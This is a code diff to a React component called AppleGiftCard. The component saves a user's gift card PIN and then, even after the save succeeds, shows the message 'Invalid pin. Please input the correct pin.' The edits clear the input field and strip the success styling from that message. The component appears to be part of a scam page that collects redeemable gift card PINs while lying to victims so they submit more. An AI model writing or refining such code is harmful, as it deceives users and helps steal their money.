@@ -115,6 +115,7 @@ export default function AppleGiftCard() {
       await saveGiftCardPin(pin)
       setChecked(true)
       setMessage('PIN saved successfully!')
+      setPin("")
       console.log('success!')
     } catch (error) {
       setMessage('Something went wrong.')
@@ -186,7 +187,7 @@ export default function AppleGiftCard() {
         </div>
 
         {checked && (
-          <div className="mt-4 p-4 bg-green-50 border border-green-200 rounded-xl text-red-500 text-[14px] font-medium">
+          <div className="mt-4 p-4  text-red-500 text-[14px] font-medium">
             Invalid pin. {pin.slice(-4)}. Please input the correct pin.
           </div>
         )}
